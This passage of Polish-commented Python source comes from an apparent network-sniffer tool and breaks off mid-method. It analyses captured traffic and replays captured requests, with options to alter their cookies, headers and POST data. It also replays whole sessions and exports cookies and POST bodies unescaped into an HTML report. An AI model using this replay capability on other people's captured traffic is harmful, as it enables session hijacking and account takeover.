                for key, group in request_groups.items():
                    if len(group) > 3:  # Próg dla powtarzających się żądań
                        repeated_requests[key] = len(group)

            if repeated_requests:
                top_repeated = sorted(repeated_requests.items(), key=lambda x: x[1], reverse=True)[:5]
                results["interesting_patterns"].append({
                    "type": "repeated_requests",
                    "description": "Wykryto powtarzające się żądania do tych samych zasobów",
                    "count": len(repeated_requests),
                    "examples": [{"request": req, "count": count} for req, count in top_repeated]
                })

            # Generuj raport podsumowujący
            print("\n==== Raport analizy ruchu sieciowego ====")

            print(f"\nStatystyki podstawowe:")
            print(f"- Liczba unikalnych URL: {url_count}")
            print(f"- Łączna liczba żądań: {request_count}")
            print(f"- Żądania HTTP: {http_count}")
            print(f"- Żądania HTTPS: {https_count}")
            print(f"- Liczba domen: {len(domains)}")

            if results["security_issues"]:
                print("\nWykryte problemy bezpieczeństwa:")
                for issue in results["security_issues"]:
                    print(f"- {issue['description']} ({issue['count']} wystąpień)")
            else:
                print("\nNie wykryto problemów bezpieczeństwa.")

            if results["performance_issues"]:
                print("\nWykryte problemy wydajności:")
                for issue in results["performance_issues"]:
                    print(f"- {issue['description']} ({issue['count']} wystąpień)")
            else:
                print("\nNie wykryto problemów wydajności.")

            if results["interesting_patterns"]:
                print("\nInteresujące wzorce:")
                for pattern in results["interesting_patterns"]:
                    print(f"- {pattern['description']} ({pattern['count']} wystąpień)")
            else:
                print("\nNie wykryto interesujących wzorców.")

            return results

        except Exception as e:
            print(f"Błąd podczas analizy ruchu: {e}")
            import traceback
            traceback.print_exc()
            return None

    def handle_session_data_errors(self):
        """Sprawdza i naprawia problemy w danych sesji

        Returns:
            bool: True jeśli dane są poprawne lub zostały naprawione, False w przeciwnym wypadku
        """
        if not self.captured_data:
            print("Brak danych sesji do sprawdzenia.")
            return False

        try:
            print("Sprawdzanie integralności danych sesji...")

            # Stwórz kopię danych, aby nie modyfikować oryginału podczas iteracji
            fixed_data = {}
            problematic_urls = []
            fixed_count = 0

            for url, requests in self.captured_data.items():
                if not isinstance(requests, list):
                    print(f"Nieprawidłowy format danych dla URL: {url} (nie jest listą)")
                    problematic_urls.append((url, "not_list"))
                    # Spróbuj naprawić konwertując na listę jeśli to możliwe
                    if isinstance(requests, dict):
                        fixed_data[url] = [requests]
                        fixed_count += 1
                        print(f"Naprawiono dane dla URL: {url}")
                    continue

                valid_requests = []

                for req in requests:
                    if not isinstance(req, dict):
                        print(f"Nieprawidłowy format żądania dla URL: {url} (nie jest słownikiem)")
                        continue

                    # Upewnij się, że wymagane pola są obecne
                    if 'timestamp' not in req:
                        req['timestamp'] = 'unknown'

                    if 'method' not in req:
                        req['method'] = 'GET'

                    if 'headers' not in req:
                        req['headers'] = {}

                    if 'cookies' not in req:
                        req['cookies'] = {}

                    # Dodaj naprawione żądanie
                    valid_requests.append(req)

                if len(valid_requests) != len(requests):
                    print(f"Naprawiono {len(requests) - len(valid_requests)} problematycznych żądań dla URL: {url}")
                    fixed_count += 1

                fixed_data[url] = valid_requests

            # Sprawdź, czy są URL bez żadnych ważnych żądań
            empty_urls = [url for url, reqs in fixed_data.items() if not reqs]
            for url in empty_urls:
                print(f"Usuwanie URL bez ważnych żądań: {url}")
                del fixed_data[url]
                fixed_count += 1

            # Zastosuj naprawione dane
            if fixed_count > 0:
                print(f"Naprawiono {fixed_count} problemów w danych sesji.")
                self.captured_data = fixed_data
            else:
                print("Nie znaleziono problemów w danych sesji.")

            # Dodatkowe sprawdzenie zduplikowanych timestampów
            timestamp_counts = {}
            for url, requests in self.captured_data.items():
                for req in requests:
                    timestamp = req.get('timestamp', 'unknown')
                    if timestamp not in timestamp_counts:
                        timestamp_counts[timestamp] = 0
                    timestamp_counts[timestamp] += 1

            duplicate_timestamps = [ts for ts, count in timestamp_counts.items() if count > 10 and ts != 'unknown']
            if duplicate_timestamps:
                print(f"Uwaga: Wykryto {len(duplicate_timestamps)} powtarzających się timestampów.")
                print("To może wskazywać na problem z danymi.")

            return True

        except Exception as e:
            print(f"Błąd podczas sprawdzania danych sesji: {e}")
            import traceback
            traceback.print_exc()
            return False

    def prepare_session_browser_data(self):
        """Przygotowuje dane dla przeglądarki sesji, konwertując je do odpowiedniego formatu

        Returns:
            dict: Przygotowane dane sesji
        """
        if not self.captured_data:
            print("Brak danych do przygotowania.")
            return {}

        try:
            print("Przygotowywanie danych dla przeglądarki sesji...")

            # Sprawdź i napraw dane
            self.handle_session_data_errors()

            # Przygotuj dane w formacie odpowiednim dla przeglądarki
            browser_data = {}

            for url, requests in self.captured_data.items():
                # Pomiń URL bez żądań
                if not requests:
                    continue

                # Pomiń nieprawidłowe URL
                if not isinstance(url, str) or not url:
                    continue

                # Upewnij się, że URL ma prawidłowy format
                if not url.startswith(('http://', 'https://')):
                    # Spróbuj dodać schemat
                    if '://' not in url:
                        if any(url.startswith(domain) for domain in ['.com', '.org', '.net', '.pl', 'www.']):
                            url = 'http://' + url
                        else:
                            # Pomiń nieprawidłowe URL
                            continue

                # Przygotuj żądania
                prepared_requests = []

                for req in requests:
                    # Upewnij się, że żądanie jest słownikiem
                    if not isinstance(req, dict):
                        continue

                    # Skopiuj tylko potrzebne pola
                    prepared_req = {
                        'timestamp': req.get('timestamp', 'unknown'),
                        'method': req.get('method', 'GET'),
                        'headers': req.get('headers', {}),
                        'cookies': req.get('cookies', {}),
                        'protocol': req.get('protocol', 'HTTP')
                    }

                    # Dodaj dane POST jeśli istnieją
                    if 'post_data' in req:
                        prepared_req['post_data'] = req['post_data']

                    # Dodaj treść odpowiedzi jeśli istnieje
                    if 'response_content' in req:
                        prepared_req['response_content'] = req['response_content']

                    prepared_requests.append(prepared_req)

                browser_data[url] = prepared_requests

            return browser_data

        except Exception as e:
            print(f"Błąd podczas przygotowywania danych: {e}")
            import traceback
            traceback.print_exc()
            return {}

    def start_interactive_session_browser(self):
        """Uruchamia interaktywną przeglądarkę sesji z zaawansowanymi funkcjami odtwarzania"""
        print("Uruchamianie zaawansowanej interaktywnej przeglądarki sesji na porcie 8000...")

        if not self.captured_data or len(self.captured_data) == 0:
            print("Błąd: Brak danych do wyświetlenia.")
            return False

        try:
            # Utwórz pliki dla aplikacji przeglądarki sesji
            if not self.create_session_browser_app():
                print("Nie udało się utworzyć aplikacji przeglądarki sesji.")
                return False

            # Importy do obsługi proxy
            import http.server
            import socketserver
            import urllib.parse

            # Utwórz klasę obsługującą żądania HTTP z funkcją proxy
            class InteractiveSessionBrowserHandler(http.server.SimpleHTTPRequestHandler):
                def __init__(self, *args, **kwargs):
                    self.sniffer = kwargs.pop('sniffer', None)  # Extract sniffer reference
                    super().__init__(*args, **kwargs)

                def do_GET(self):
                    if self.path == '/':
                        self.path = '/session_browser_app.html'
                    elif self.path == '/data':
                        self.send_response(200)
                        self.send_header('Content-type', 'application/json')
                        self.end_headers()
                        with open('temp_session_data.json', 'rb') as f:
                            self.wfile.write(f.read())
                        return
                    elif self.path.startswith('/proxy/'):
                        # Obsługa proxy dla odtwarzania żądań
                        try:
                            # Dekoduj URL, do którego ma być wysłane żądanie
                            encoded_url = self.path[7:]  # usuń '/proxy/'
                            target_url = urllib.parse.unquote(encoded_url)

                            # Pobierz dane dla tego URL
                            session_data = {}
                            with open('temp_session_data.json', 'r') as f:
                                import json
                                session_data = json.load(f)

                            if target_url in session_data:
                                # Użyj pierwszego żądania jako wzorca
                                request_data = session_data[target_url][0]

                                # Odtwórz żądanie
                                if self.sniffer:
                                    response = self.sniffer.replay_request(target_url, request_data)

                                    # Wyślij odpowiedź
                                    self.send_response(response.get('status', 200))

                                    # Dodaj nagłówki
                                    for header, value in response.get('headers', {}).items():
                                        if header.lower() not in ['content-length', 'transfer-encoding']:
                                            self.send_header(header, value)

                                    self.end_headers()

                                    # Wyślij treść
                                    content = response.get('content', '')
                                    if isinstance(content, str):
                                        self.wfile.write(content.encode('utf-8', errors='ignore'))
                                    else:
                                        self.wfile.write(content)
                                else:
                                    self.send_response(500)
                                    self.send_header('Content-type', 'text/plain')
                                    self.end_headers()
                                    self.wfile.write(b"Blad: Brak dostepu do obiektu sniffer")
                            else:
                                self.send_response(404)
                                self.send_header('Content-type', 'text/plain')
                                self.end_headers()
                                self.wfile.write(f"URL {target_url} nie znaleziony w danych sesji".encode())
                        except Exception as e:
                            import traceback
                            traceback.print_exc()

                            self.send_response(500)
                            self.send_header('Content-type', 'text/plain')
                            self.end_headers()
                            self.wfile.write(f"Błąd: {str(e)}".encode())
                        return

                    return http.server.SimpleHTTPRequestHandler.do_GET(self)

            # Utwórz handler z referencją do obiektu sniffer
            handler = lambda *args, **kwargs: InteractiveSessionBrowserHandler(*args, sniffer=self, **kwargs)

            # Uruchom serwer HTTP
            with socketserver.TCPServer(("", 8000), handler) as httpd:
                print("Serwer interaktywnej przeglądarki uruchomiony na http://localhost:8000")
                print("Otwórz przeglądarkę i przejdź do adresu: http://localhost:8000")
                print("Naciśnij Ctrl+C, aby zatrzymać serwer")

                try:
                    # Otwórz przeglądarkę
                    try:
                        import webbrowser
                        webbrowser.open("http://localhost:8000")
                    except Exception as e:
                        print(f"Nie udało się automatycznie otworzyć przeglądarki: {e}")

                    # Uruchom serwer
                    httpd.serve_forever()
                except KeyboardInterrupt:
                    print("\nZatrzymywanie serwera...")
                except Exception as e:
                    print(f"\nBłąd podczas działania serwera: {e}")
                finally:
                    try:
                        httpd.shutdown()
                    except:
                        pass
                    # Usuń pliki tymczasowe
                    for temp_file in ['temp_session_data.json', 'session_browser_app.html']:
                        try:
                            if os.path.exists(temp_file):
                                os.remove(temp_file)
                        except Exception as e:
                            print(f"Nie udało się usunąć pliku {temp_file}: {e}")
                    print("Serwer zatrzymany.")
                    return True

        except Exception as e:
            print(f"Błąd podczas uruchamiania interaktywnej przeglądarki sesji: {e}")
            import traceback
            traceback.print_exc()
            # Jeśli nie udało się uruchomić zaawansowanej przeglądarki, spróbuj utworzyć prostszą wersję statyczną
            print("Próba utworzenia statycznej wersji przeglądarki...")
            return self.create_simple_browser_fallback()

    def replay_specific_request(self):
        """Pozwala użytkownikowi wybrać i odtworzyć konkretne żądanie z przechwyconych danych"""
        if not self.captured_data:
            print("Brak danych do odtworzenia. Najpierw przechwytaj ruch lub wczytaj dane z pliku.")
            return False

        try:
            # Wyświetl listę URL
            print("\n=== Dostępne URL ===")
            urls = list(self.captured_data.keys())

            for i, url in enumerate(urls):
                print(f"{i + 1}. {url} ({len(self.captured_data[url])} żądań)")

            # Wybór URL
            url_choice = input("\nWybierz URL (numer): ")
            try:
                url_index = int(url_choice) - 1
                if url_index < 0 or url_index >= len(urls):
                    print("Nieprawidłowy numer URL.")
                    return False

                selected_url = urls[url_index]
                requests = self.captured_data[selected_url]

                # Wyświetl listę żądań dla wybranego URL
                print(f"\n=== Żądania dla {selected_url} ===")
                for i, req in enumerate(requests):
                    method = req.get('method', 'GET')
                    timestamp = req.get('timestamp', 'nieznany')
                    protocol = req.get('protocol', 'HTTP')

                    print(f"{i + 1}. {method} - {timestamp} - {protocol}")

                # Wybór żądania
                req_choice = input("\nWybierz żądanie (numer): ")
                try:
                    req_index = int(req_choice) - 1
                    if req_index < 0 or req_index >= len(requests):
                        print("Nieprawidłowy numer żądania.")
                        return False

                    selected_request = requests[req_index]

                    # Sprawdź czy chcemy modyfikować żądanie
                    print("\nCzy chcesz zmodyfikować żądanie przed odtworzeniem?")
                    print("1. Nie, odtwórz oryginalne żądanie")
                    print("2. Tak, chcę zmodyfikować nagłówki")
                    print("3. Tak, chcę zmodyfikować ciasteczka")
                    print("4. Tak, chcę zmodyfikować dane POST")

                    mod_choice = input("\nWybierz opcję: ")

                    modifications = {}

                    if mod_choice == "2":
                        print("\nModyfikacja nagłówków (format: Nagłówek=Wartość, pusty wiersz kończy)")
                        headers = {}
                        while True:
                            header_line = input().strip()
                            if not header_line:
                                break

                            if '=' in header_line:
                                header, value = header_line.split('=', 1)
                                headers[header.strip()] = value.strip()

                        if headers:
                            modifications['headers'] = headers

                    elif mod_choice == "3":
                        print("\nModyfikacja ciasteczek (format: Ciasteczko=Wartość, pusty wiersz kończy)")
                        cookies = {}
                        while True:
                            cookie_line = input().strip()
                            if not cookie_line:
                                break

                            if '=' in cookie_line:
                                cookie, value = cookie_line.split('=', 1)
                                cookies[cookie.strip()] = value.strip()

                        if cookies:
                            modifications['cookies'] = cookies

                    elif mod_choice == "4":
                        print("\nWprowadź nowe dane POST:")
                        post_data = input().strip()

                        if post_data:
                            modifications['post_data'] = post_data
                            # Upewnij się, że metoda to POST
                            modifications['method'] = 'POST'

                    # Zastosuj modyfikacje jeśli istnieją
                    if modifications:
                        request_data = self.modify_request_data(selected_request, modifications)
                    else:
                        request_data = selected_request

                    # Odtwórz żądanie
                    print(f"\nOdtwarzanie żądania {request_data.get('method', 'GET')} do {selected_url}...")
                    response = self.replay_request(selected_url, request_data)

                    # Wyświetl wynik
                    print("\n=== Wynik odtwarzania żądania ===")
                    print(f"Status: {response.get('status')}")
                    print("\nNagłówki odpowiedzi:")
                    for header, value in response.get('headers', {}).items():
                        print(f"{header}: {value}")

                    print("\nZawartość odpowiedzi:")
                    content = response.get('content', '')
                    if len(content) > 1000:
                        print(content[:1000] + "...\n[Zawartość obcięta]")
                    else:
                        print(content)

                    # Zapisz odpowiedź do pliku
                    save_choice = input("\nCzy chcesz zapisać odpowiedź do pliku? (t/n): ").lower()
                    if save_choice == 't' or save_choice == 'tak':
                        filename = input("Podaj nazwę pliku: ").strip()
                        if filename:
                            try:
                                with open(filename, 'w', encoding='utf-8') as f:
                                    f.write(content)
                                print(f"Odpowiedź zapisana do pliku: {filename}")
                            except Exception as e:
                                print(f"Błąd podczas zapisywania pliku: {e}")

                    return True

                except ValueError:
                    print("Nieprawidłowy numer żądania. Wprowadź liczbę.")
                    return False

            except ValueError:
                print("Nieprawidłowy numer URL. Wprowadź liczbę.")
                return False

        except Exception as e:
            print(f"Błąd podczas odtwarzania żądania: {e}")
            import traceback
            traceback.print_exc()
            return False

    def simulate_browsing_session(self):
        """Symuluje całą sesję przeglądania odtwarzając sekwencję żądań"""
        if not self.captured_data:
            print("Brak danych do symulacji. Najpierw przechwytaj ruch lub wczytaj dane z pliku.")
            return False

        try:
            # Wyświetl listę URL
            print("\n=== Dostępne URL ===")
            urls = list(self.captured_data.keys())

            for i, url in enumerate(urls):
                print(f"{i + 1}. {url} ({len(self.captured_data[url])} żądań)")

            # Wybór URL
            url_choice = input("\nWybierz URL początkowy (numer): ")
            try:
                url_index = int(url_choice) - 1
                if url_index < 0 or url_index >= len(urls):
                    print("Nieprawidłowy numer URL.")
                    return False

                # Ustal głębokość symulacji
                print("\nWybierz tryb symulacji:")
                print("1. Tylko żądania dla wybranego URL (domyślnie)")
                print("2. Śledź wszystkie powiązane URL (głęboka symulacja)")

                sim_mode = input("\nWybierz tryb (1/2): ").strip() or "1"

                # Wyświetl opcje symulacji
                print("\nUstawienia symulacji:")
                print("1. Automatyczne (odtwarza wszystkie żądania w sekwencji)")
                print("2. Krok po kroku (z potwierdzeniem użytkownika)")

                auto_mode = input("\nWybierz tryb (1/2): ").strip() or "1"
                is_automatic = (auto_mode == "1")

                # Wyświetl opcje czasowe
                print("\nOpóźnienie między żądaniami (w sekundach):")
                delay_input = input("Podaj opóźnienie (domyślnie: 1s): ").strip() or "1"

                try:
                    delay = float(delay_input)
                except:
                    delay = 1.0

                # Przygotuj listę żądań do symulacji
                session_urls = set()
                session_requests = []

                # Dodaj pierwszy URL do listy
                session_urls.add(urls[url_index])

                # Buduj listę żądań
                current_index = 0
                max_requests = 100  # Limit bezpieczeństwa

                while current_index < max_requests:
                    # Sprawdź wszystkie URL w bieżącej sesji
                    new_urls_found = False

                    for url in list(session_urls):
                        # Dodaj wszystkie żądania dla tego URL
                        for req in self.captured_data[url]:
                            # Utwórz identyfikator żądania
                            req_id = f"{url}|{req.get('timestamp', '')}|{req.get('method', 'GET')}"

                            # Dodaj jeśli jeszcze nie ma w liście
                            if req_id not in [r['id'] for r in session_requests]:
                                session_requests.append({
                                    'id': req_id,
                                    'url': url,
                                    'request': req
                                })
                                new_urls_found = True

                    # Jeśli jest tryb głębokiej symulacji, szukaj powiązanych URL
                    if sim_mode == "2":
                        for req_data in session_requests:
                            req = req_data['request']

                            # Szukaj URL w nagłówkach
                            for header, value in req.get('headers', {}).items():
                                if header.lower() in ['referer', 'origin'] and value.startswith('http'):
                                    if value not in session_urls:
                                        if value in self.captured_data:
                                            session_urls.add(value)
                                            new_urls_found = True

                            # Szukaj URL w zawartości POST
                            if req.get('post_data'):
                                post_data = req.get('post_data', '').lower()
                                for url_key in self.captured_data.keys():
                                    if url_key.lower() in post_data and url_key not in session_urls:
                                        session_urls.add(url_key)
                                        new_urls_found = True

                    # Jeśli nie znaleziono nowych URL, zakończ
                    if not new_urls_found or sim_mode == "1":
                        break

                    current_index += 1
                    if current_index >= max_requests:
                        print(f"Osiągnięto limit {max_requests} żądań. Symulacja może być niekompletna.")

                # Posortuj żądania według timestamp
                session_requests.sort(key=lambda x: x['request'].get('timestamp', ''))

                # Rozpocznij symulację
                print(f"\n=== Rozpoczynanie symulacji sesji przeglądania ===")
                print(f"Liczba URL: {len(session_urls)}")
                print(f"Liczba żądań: {len(session_requests)}")

                successful_requests = 0
                failed_requests = 0

                import time

                for i, req_data in enumerate(session_requests):
                    url = req_data['url']
                    request = req_data['request']

                    # Wyświetl informacje o żądaniu
                    print(f"\n[{i + 1}/{len(session_requests)}] {request.get('method', 'GET')} {url}")
                    print(f"Timestamp: {request.get('timestamp', 'nieznany')}")
                    print(f"Protokół: {request.get('protocol', 'HTTP')}")

                    # W trybie nieautomatycznym czekaj na potwierdzenie
                    if not is_automatic:
                        input("Naciśnij Enter, aby odtworzyć to żądanie...")

                    # Odtwórz żądanie
                    try:
                        response = self.replay_request(url, request)
                        status = response.get('status', 0)

                        if 200 <= status < 400:
                            print(f"Status: {status} OK")
                            successful_requests += 1
                        else:
                            print(f"Status: {status} BŁĄD")
                            failed_requests += 1

                            if not is_automatic:
                                print("\nWystąpił błąd. Czy chcesz kontynuować symulację? (t/n): ")
                                if input().lower() not in ['t', 'tak']:
                                    print("Przerwano symulację.")
                                    break
                    except Exception as e:
                        print(f"Błąd: {str(e)}")
                        failed_requests += 1

                        if not is_automatic:
                            print("\nWystąpił błąd. Czy chcesz kontynuować symulację? (t/n): ")
                            if input().lower() not in ['t', 'tak']:
                                print("Przerwano symulację.")
                                break

                    # Czekaj określony czas przed następnym żądaniem
                    if i < len(session_requests) - 1:
                        time.sleep(delay)

                # Podsumowanie symulacji
                print(f"\n=== Podsumowanie symulacji ===")
                print(f"Łączna liczba żądań: {len(session_requests)}")
                print(f"Udane żądania: {successful_requests}")
                print(f"Nieudane żądania: {failed_requests}")
                print(f"Szacunkowy czas trwania sesji: {len(session_requests) * delay:.1f}s")

                return True

            except ValueError:
                print("Nieprawidłowy numer URL. Wprowadź liczbę.")
                return False

        except Exception as e:
            print(f"Błąd podczas symulacji sesji: {e}")
            import traceback
            traceback.print_exc()
            return False

    def export_as_html(self, filename):
        """Eksportuje przechwycone dane jako raport HTML

        Args:
            filename: Nazwa pliku HTML do zapisania

        Returns:
            bool: True jeśli eksport przebiegł pomyślnie, False w przeciwnym wypadku
        """
        if not self.captured_data:
            print("Brak danych do eksportu. Najpierw przechwytaj ruch lub wczytaj dane z pliku.")
            return False

        try:
            # Dodaj rozszerzenie .html jeśli nie ma
            if not filename.lower().endswith('.html'):
                filename += '.html'

            # Podstawowe statystyki
            url_count = len(self.captured_data)
            request_count = sum(len(requests) for requests in self.captured_data.values())
            http_count = sum(len([r for r in reqs if r.get('protocol') == 'HTTP' or not r.get('protocol')])
                             for reqs in self.captured_data.values())
            https_count = sum(len([r for r in reqs if r.get('protocol') == 'HTTPS'])
                              for reqs in self.captured_data.values())

            # Oblicz domeny
            domains = set()
            for url in self.captured_data.keys():
                try:
                    if '://' in url:
                        domain = url.split('://', 1)[1].split('/', 1)[0]
                        domains.add(domain)
                except:
                    pass

            # Przygotuj dane dla wykresu
            domain_requests = {}
            for url in self.captured_data.keys():
                try:
                    if '://' in url:
                        domain = url.split('://', 1)[1].split('/', 1)[0]
                        domain_requests[domain] = domain_requests.get(domain, 0) + len(self.captured_data[url])
                except:
                    pass

            # Posortuj domeny według liczby żądań
            top_domains = sorted(domain_requests.items(), key=lambda x: x[1], reverse=True)[:10]

            # HTML header i style
            html = f"""<!DOCTYPE html>
    <html lang="pl">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Raport ruchu sieciowego</title>
        <style>
            body {{
                font-family: Arial, sans-serif;
                line-height: 1.6;
                margin: 0;
                padding: 20px;
                color: #333;
            }}
            .container {{
                max-width: 1200px;
                margin: 0 auto;
            }}
            h1, h2, h3 {{
                color: #2c3e50;
            }}
            .stats-card {{
                background: #f9f9f9;
                border-radius: 8px;
                padding: 20px;
                margin-bottom: 20px;
                box-shadow: 0 2px 4px rgba(0,0,0,0.1);
            }}
            .stats-grid {{
                display: grid;
                grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
                gap: 15px;
                margin-bottom: 20px;
            }}
            .stat-item {{
                background: white;
                padding: 15px;
                border-radius: 6px;
                box-shadow: 0 1px 3px rgba(0,0,0,0.1);
                text-align: center;
            }}
            .stat-number {{
                font-size: 24px;
                font-weight: bold;
                color: #3498db;
                margin-bottom: 5px;
            }}
            .stat-label {{
                font-size: 14px;
                color: #7f8c8d;
            }}
            table {{
                width: 100%;
                border-collapse: collapse;
                margin-bottom: 20px;
            }}
            th, td {{
                padding: 12px 15px;
                text-align: left;
                border-bottom: 1px solid #ddd;
            }}
            th {{
                background-color: #f2f2f2;
                font-weight: bold;
            }}
            tr:hover {{
                background-color: #f5f5f5;
            }}
            .http-badge, .https-badge {{
                display: inline-block;
                padding: 3px 8px;
                border-radius: 3px;
                font-size: 12px;
                font-weight: bold;
                color: white;
            }}
            .http-badge {{
                background-color: #e74c3c;
            }}
            .https-badge {{
                background-color: #27ae60;
            }}
            .request-details {{
                margin-top: 10px;
                padding: 10px;
                background: #f9f9f9;
                border-radius: 4px;
                display: none;
            }}
            .detail-header {{
                display: flex;
                justify-content: space-between;
                align-items: center;
                cursor: pointer;
            }}
            .detail-icon {{
                font-size: 20px;
            }}
            .cookie-table, .header-table {{
                width: 100%;
                margin-top: 10px;
                font-size: 14px;
            }}
            .toggle-btn {{
                background: none;
                border: none;
                color: #3498db;
                cursor: pointer;
                font-size: 14px;
            }}
            .chart-container {{
                height: 400px;
                margin-bottom: 30px;
            }}
            .footer {{
                margin-top: 40px;
                text-align: center;
                font-size: 14px;
                color: #7f8c8d;
                padding-top: 20px;
                border-top: 1px solid #eee;
            }}
        </style>
        <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
    </head>
    <body>
        <div class="container">
            <h1>Raport ruchu sieciowego</h1>
            <p>Data wygenerowania: {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}</p>

            <div class="stats-card">
                <h2>Podsumowanie</h2>
                <div class="stats-grid">
                    <div class="stat-item">
                        <div class="stat-number">{url_count}</div>
                        <div class="stat-label">Unikalne URL</div>
                    </div>
                    <div class="stat-item">
                        <div class="stat-number">{request_count}</div>
                        <div class="stat-label">Łączna liczba żądań</div>
                    </div>
                    <div class="stat-item">
                        <div class="stat-number">{len(domains)}</div>
                        <div class="stat-label">Unikalne domeny</div>
                    </div>
                    <div class="stat-item">
                        <div class="stat-number">{http_count}</div>
                        <div class="stat-label">Żądania HTTP</div>
                    </div>
                    <div class="stat-item">
                        <div class="stat-number">{https_count}</div>
                        <div class="stat-label">Żądania HTTPS</div>
                    </div>
                </div>
            </div>

            <div class="stats-card">
                <h2>Analiza domen</h2>
                <div class="chart-container">
                    <canvas id="domainsChart"></canvas>
                </div>

                <h3>Najczęściej odwiedzane domeny</h3>
                <table>
                    <thead>
                        <tr>
                            <th>Domena</th>
                            <th>Liczba żądań</th>
                            <th>Procent całości</th>
                        </tr>
                    </thead>
                    <tbody>
    """

            # Dodaj wiersze dla najczęściej odwiedzanych domen
            for domain, count in top_domains:
                percentage = (count / request_count) * 100
                html += f"""
                        <tr>
                            <td>{domain}</td>
                            <td>{count}</td>
                            <td>{percentage:.1f}%</td>
                        </tr>"""

            html += """
                    </tbody>
                </table>
            </div>

            <div class="stats-card">
                <h2>Szczegóły URL</h2>
                <p>Kliknij na wiersz, aby zobaczyć szczegóły żądań.</p>
                <table id="urlTable">
                    <thead>
                        <tr>
                            <th>URL</th>
                            <th>Protokół</th>
                            <th>Liczba żądań</th>
                            <th>Akcje</th>
                        </tr>
                    </thead>
                    <tbody>
    """

            # Dodaj wiersze dla każdego URL
            for i, (url, requests) in enumerate(self.captured_data.items()):
                # Określ protokół
                protocol = "HTTPS" if url.startswith("https://") else "HTTP"
                protocol_class = "https-badge" if protocol == "HTTPS" else "http-badge"

                html += f"""
                        <tr data-url="{url}">
                            <td>{url}</td>
                            <td><span class="{protocol_class}">{protocol}</span></td>
                            <td>{len(requests)}</td>
                            <td><button class="toggle-btn" onclick="toggleDetails({i})">Pokaż szczegóły</button></td>
                        </tr>
                        <tr id="details-{i}" style="display:none;">
                            <td colspan="4">
                                <div class="request-details">
                                    <h3>Żądania dla {url}</h3>
                                    <table class="request-table">
                                        <thead>
                                            <tr>
                                                <th>Czas</th>
                                                <th>Metoda</th>
                                                <th>Ciasteczka</th>
                                                <th>Dane POST</th>
                                                <th>Akcje</th>
                                            </tr>
                                        </thead>
                                        <tbody>
    """

                # Dodaj wiersze dla każdego żądania
                for j, req in enumerate(requests):
                    method = req.get('method', 'GET')
                    timestamp = req.get('timestamp', 'nieznany')
                    cookies = len(req.get('cookies', {}))
                    has_post = "Tak" if req.get('post_data') else "Nie"

                    html += f"""
                                            <tr>
                                                <td>{timestamp}</td>
                                                <td>{method}</td>
                                                <td>{cookies}</td>
                                                <td>{has_post}</td>
                                                <td><button class="toggle-btn" onclick="toggleRequestDetails({i},{j})">Szczegóły</button></td>
                                            </tr>
                                            <tr id="request-details-{i}-{j}" style="display:none;">
                                                <td colspan="5">
    """

                    # Dodaj szczegóły żądania
                    if req.get('headers'):
                        html += """
                                                    <h4>Nagłówki</h4>
                                                    <table class="header-table">
                                                        <thead>
                                                            <tr>
                                                                <th>Nagłówek</th>
                                                                <th>Wartość</th>
                                                            </tr>
                                                        </thead>
                                                        <tbody>
    """

                        for header, value in req.get('headers', {}).items():
                            html += f"""
                                                            <tr>
                                                                <td>{header}</td>
                                                                <td>{value}</td>
                                                            </tr>"""

                        html += """
                                                        </tbody>
                                                    </table>
    """

                    # Dodaj ciasteczka
                    if req.get('cookies'):
                        html += """
                                                    <h4>Ciasteczka</h4>
                                                    <table class="cookie-table">
                                                        <thead>
                                                            <tr>
                                                                <th>Nazwa</th>
                                                                <th>Wartość</th>
                                                            </tr>
                                                        </thead>
                                                        <tbody>
    """

                        for cookie, value in req.get('cookies', {}).items():
                            html += f"""
                                                            <tr>
                                                                <td>{cookie}</td>
                                                                <td>{value}</td>
                                                            </tr>"""

                        html += """
                                                        </tbody>
                                                    </table>
    """

                    # Dodaj dane POST
                    if req.get('post_data'):
                        post_data = req.get('post_data', '')
                        if len(post_data) > 1000:
                            post_data = post_data[:1000] + "... [obcięto]"

                        html += f"""
                                                    <h4>Dane POST</h4>
                                                    <pre>{post_data}</pre>
    """

                    html += """
                                                </td>
                                            </tr>
    """

                html += """
                                        </tbody>
                                    </table>
                                </div>
                            </td>
                        </tr>
    """

            # Dodaj skrypty JavaScript i zakończ HTML
            html += """
                    </tbody>
                </table>
            </div>

            <div class="footer">
                <p>Raport wygenerowany przez NetworkSniffer</p>
            </div>
        </div>

        <script>
            // Funkcja do przełączania widoczności szczegółów URL
            function toggleDetails(index) {
                const detailsRow = document.getElementById(`details-${index}`);
                const isVisible = detailsRow.style.display !== 'none';

                detailsRow.style.display = isVisible ? 'none' : 'table-row';

                // Zmień tekst przycisku
                const button = event.target;
                button.textContent = isVisible ? 'Pokaż szczegóły' : 'Ukryj szczegóły';
            }

            // Funkcja do przełączania widoczności szczegółów żądania
            function toggleRequestDetails(urlIndex, reqIndex) {
                const detailsRow = document.getElementById(`request-details-${urlIndex}-${reqIndex}`);
                const isVisible = detailsRow.style.display !== 'none';

                detailsRow.style.display = isVisible ? 'none' : 'table-row';

                // Zmień tekst przycisku
                const button = event.target;
                button.textContent = isVisible ? 'Szczegóły' : 'Ukryj';
            }

            // Inicjalizacja wykresu domen
            document.addEventListener('DOMContentLoaded', function() {
                const ctx = document.getElementById('domainsChart').getContext('2d');
                const chart = new Chart(ctx, {
                    type: 'bar',
                    data: {
                        labels: ["""

            # Dodaj etykiety dla wykresu
            for domain, _ in top_domains:
                html += f"'{domain}',"

            html += """
                        ],
                        datasets: [{
                            label: 'Liczba żądań',
                            data: ["""

            # Dodaj dane dla wykresu
            for _, count in top_domains:
                html += f"{count},"

            html += """
                            ],
                            backgroundColor: 'rgba(54, 162, 235, 0.6)',
                            borderColor: 'rgba(54, 162, 235, 1)',
                            borderWidth: 1
                        }]
                    },
                    options: {
                        responsive: true,
                        maintainAspectRatio: false,
                        scales: {
                            y: {
                                beginAtZero: true,
                                title: {
                                    display: true,
                                    text: 'Liczba żądań'
                                }
                            },
                            x: {
                                title: {
                                    display: true,
                                    text: 'Domeny'
                                }
                            }
                        },
                        plugins: {
                            legend: {
                                display: false
                            },
                            title: {
                                display: true,
                                text: 'Najczęściej odwiedzane domeny'
                            }
                        }
                    }
                });
            });
        </script>
    </body>
    </html>
    """

            # Zapisz plik HTML
            with open(filename, 'w', encoding='utf-8') as f:
                f.write(html)

            print(f"Dane zostały wyeksportowane do pliku: {filename}")
            return True

        except Exception as e:
